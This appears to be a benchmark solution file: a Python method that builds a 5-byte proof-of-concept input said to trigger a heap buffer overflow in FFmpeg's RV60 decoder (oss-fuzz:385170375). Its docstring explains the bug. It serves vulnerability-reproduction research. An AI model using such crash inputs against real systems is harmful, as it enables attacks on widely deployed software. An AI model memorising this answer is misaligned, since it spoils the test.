import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for the heap buffer overflow in FFmpeg's RV60 decoder.

        The vulnerability (oss-fuzz:385170375) is in `ff_rv56_decode_picture`.
        The function incorrectly initializes a GetBitContext with the full input
        packet size (`buf_size`) instead of the smaller, actual slice data size
        (`slice_buf_size`) that was copied into an internal buffer. This causes
        the slice decoder to read past the valid data into uninitialized heap memory.

        This PoC is a minimal raw video packet designed to trigger this condition:
        - It consists of a 4-byte picture header followed by 1 byte of slice data.
        - The 4-byte header (all zeros) sets safe defaults (I-frame, QP=0) and
          specifies `num_slices_minus1 = 0` (for a single slice).
        - When parsed, this 5-byte packet results in:
          - `buf_size` = 5
          - `header_size` = 4
          - `slice_buf_size` = 5 - 4 = 1
        - The vulnerable `init_get_bits` call uses `buf_size` (5), while the
          buffer only contains 1 valid byte. The subsequent read in the slice
          decoder overflows.
        """
        
        # 4-byte header: includes picture properties and num_slices_minus1 = 0
        header = b'\x00\x00\x00\x00'
        
        # 1 byte of arbitrary slice data. The content doesn't matter, only
        # that its presence triggers the slice decoding logic.
        slice_data = b'\x01'
        
        poc = header + slice_data
        return poc